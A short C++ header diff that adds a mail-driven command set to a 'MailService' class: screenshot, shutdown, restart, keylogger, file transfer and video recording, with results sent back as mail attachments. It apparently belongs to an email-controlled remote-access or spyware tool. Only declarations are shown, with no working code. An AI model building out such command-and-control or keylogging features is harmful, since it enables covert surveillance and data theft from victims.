@@ -3,6 +3,22 @@
 #include <fstream>
 #include <queue>
 
+enum class MailCommand {
+    NONE = 0,
+    SCREENSHOT = 1,
+    SHUTDOWN = 2,
+    RESTART = 3,
+    KEYLOGGER = 4,
+    FILE_TRANSFER = 5,
+    VIDEO_RECORDING = 6
+};
+
+struct MailAttachment {
+    std::string name;
+    MailCommand command;
+    std::string content;
+};
+
 class MailService {
     CURL *m_Curl;
     std::string m_Username;
@@ -33,5 +49,7 @@ public:
 
     void HandleMailCommand(int mailId);
 
-    void Response(const std::string &to, const std::string &body, const char *attachment);
+    void Response(const std::string &to, const std::string &body, MailAttachment *attachment);
+
+    DWORD StartMailService(LPVOID *lpParam);
 };
